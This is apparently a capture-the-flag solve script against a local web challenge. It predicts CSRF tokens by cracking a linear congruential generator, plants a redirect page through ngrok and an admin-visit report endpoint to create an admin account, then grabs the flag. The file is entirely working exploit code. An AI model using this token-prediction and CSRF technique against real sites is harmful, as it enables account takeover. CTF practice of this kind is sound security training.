import requests
import re
import time
from Crypto.Util.number import *
s = requests.Session()
params = {
	"username":"test",
	"password":"test"
}
s.get("http://localhost:8000/register",params=params)
s.get("http://localhost:8000/login",params=params)
r = s.get("http://localhost:8000/addadmin")
# Get the 3 different token
x0 = int(re.findall('value\="(.*)"',r.text)[0],16)
time.sleep(30)
r = s.get("http://localhost:8000/addadmin")
x1 = int(re.findall('value\="(.*)"',r.text)[0],16)
time.sleep(30)
r = s.get("http://localhost:8000/addadmin")
x2 = int(re.findall('value\="(.*)"',r.text)[0],16)

print(hex(x0),hex(x1),hex(x2))
# Calculate the value of A and C to crack the LCG
m = 0xc4f3b4b3deadbeef1337c0dedeadc0dd
a = (x2-x1)* inverse(x1-x0,m) % m
c = x1-a*x0%m
X = [bytes_to_long(b'admin')]
for i in range(10):
	X.append((a*X[i]+c)%m)
# Calculate the admin's token
print(hex(X[1]))

open("test.html",'w').write(f'<script>document.location="http://localhost/addadmin?username=pwn&password=pwn&csrf-token={hex(X[1])[2:]}";</script>')
# Host it with python http server and open public url with ngrok
data = {
	"url":"http://bf08-14-192-212-10.ngrok.io/test.html"
}
r = s.post("http://localhost:8000/report",data=data)
while "Admin will view the URL shortly!" not in r.text:
	r = s.post("http://localhost:8000/report",data=data)

# If the csrf attack success, will create an admin acc pwn
s = requests.Session()
params = {
	"username":"pwn",
	"password":"pwn"
}
s.get("http://localhost:8000/login",params=params)
# Login and get the flag
r = s.get("http://localhost:8000/")
print(re.findall('ACSC{.*}',r.text)[0])